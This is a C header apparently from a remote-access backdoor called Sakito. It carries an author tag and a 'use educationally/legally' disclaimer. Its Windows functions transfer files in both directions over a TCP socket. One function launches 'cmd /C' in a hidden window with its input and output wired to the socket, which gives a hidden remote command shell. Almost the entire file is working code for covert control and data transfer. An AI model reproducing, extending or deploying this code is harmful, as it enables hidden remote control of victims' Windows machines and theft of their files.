/* 
Coded by d4rkstat1c.
Use educationally/legally.
*/
#ifndef SAKITO_CORE_H
#define SAKITO_CORE_H

#define BUFLEN 8192
#define SUCCESS 1
#define FAILURE -1
#define EXIT_SUCCESS 0
#define EOS "\xcf"
#define INIT_CONN "1"
#define BACKGROUND -100
#define FTRANSFER_FINISHED "1"
#define FTRANSFER_START "1"
#define DIR_NOT_FOUND '0'


#if defined(_WIN32) || defined(_WIN64) || (defined(__CYGWIN__) && !defined(_WIN32))
	HANDLE sakito_win_openf(const LPCTSTR filename, const DWORD desired_access, const DWORD creation_dispostion) {
		return CreateFile(filename,
				desired_access,
				0,
				NULL,
				creation_dispostion,
				FILE_ATTRIBUTE_NORMAL,
				NULL);
	}

	// Function for sending file to client (TCP file transfer).
	int sakito_win_sendf(HANDLE h_file, const SOCKET socket, char* const buf, int32_t f_size) {
		u_long f_size_bytes = ntohl(f_size); // u_long == int32_t

		// Send serialized file size int32 bytes to server.
		if (send(socket, (char*)&f_size_bytes, sizeof(f_size_bytes), 0) < 1)
			return SOCKET_ERROR;

		int i_result = SUCCESS;

		if (f_size > 0) {
			// Recursively read file until EOF is detected and send file bytes to client in BUFLEN chunks.
			DWORD bytes_read;
			while ((ReadFile(h_file, buf, BUFLEN, &bytes_read, NULL))
				&& (bytes_read != 0)
				&& (i_result > 0))
				i_result = send(socket, buf, bytes_read, 0);
		}

		// Close the file.
		CloseHandle(h_file);

		return i_result;
	}

	// Function to receive file from client (TCP file transfer).
	int sakito_win_recvf(HANDLE h_file, const SOCKET socket, char* const buf, int32_t f_size) {
		int i_result = 1;

		// Receive all file bytes/chunks and write to parsed filename.
		int32_t total = 0;
		DWORD bytes_written;

		do
			i_result = recv(socket, buf, BUFLEN, 0);
		while ((WriteFile(h_file, buf, i_result, &bytes_written, NULL))
				&& ((total += bytes_written) != f_size)
				&& (i_result > 0));

		return i_result;
	}

	BOOL sakito_win_cp(const SOCKET socket, const LPSTR buf) {
		STARTUPINFO si;
		PROCESS_INFORMATION pi;

		ZeroMemory( &si, sizeof(si) );
		si.cb = sizeof(si);
		ZeroMemory( &pi, sizeof(pi) );

		if (socket) {
			si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
			si.wShowWindow = SW_HIDE;
			si.hStdInput = (HANDLE)socket;
			si.hStdOutput = (HANDLE)socket;
			si.hStdError = (HANDLE)socket;
		}

		// 7 + 1 for null termination/string truncation.
		char cmd[BUFLEN+8] = "cmd /C ";
		strcat(cmd, buf);

		// Launch the child process & execute the command. 
		BOOL i_result = CreateProcess(NULL,
					cmd,
					NULL,
					NULL,
					TRUE,
					0,
					NULL,
					NULL,
					&si,
					&pi);

		if (i_result)
			// Wait until child process exits.
			WaitForSingleObject(pi.hProcess, INFINITE);

		// Close process and thread handles. 
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);

		return i_result;
	}
#endif

// Function to copy int bytes to new memory block/location to abide strict aliasing.
static inline int32_t ntohl_conv(char* const buf) {
	int32_t new;
	memcpy(&new, buf, sizeof(new));

	// Return deserialized bytes.
	return ntohl(new);
}

#endif
